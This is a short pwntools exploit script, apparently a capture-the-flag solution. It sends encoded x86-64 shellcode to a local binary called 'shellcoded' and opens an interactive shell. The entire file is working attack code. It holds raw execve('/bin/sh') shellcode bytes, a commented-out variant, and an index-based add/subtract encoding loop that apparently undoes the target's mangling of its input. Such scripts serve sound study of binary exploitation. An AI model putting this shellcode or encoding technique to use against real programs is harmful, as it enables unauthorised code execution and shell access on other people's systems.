from pwn import *

#sc = list(bytes(bytearray(b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05')))

sc = list(bytes(bytearray(b'\x48\x8D\x67\x50\x48\x89\xC6\x48\x89\xC2\xB0\x3B\x90\x52\x90\x68\x2F\x2F\x62\x69\x68\x6E\x2F\x73\x68\x90\x48\x89\xE7\x68\x41\x41\x41\x41\x66\x81\x34\x24\x44\x4E\x49\x89\xE0\x41\xFF\xD0')))

print(sc)

for i in range(len(sc)):
    if (i & 1 == 0):
        sc[i] -= i
    elif (i & 1 != 0):
        sc[i] += i

sc = bytes(sc)

io = process('./shellcoded')
print(io.recv())
pause()
io.sendline(sc)
io.interactive()
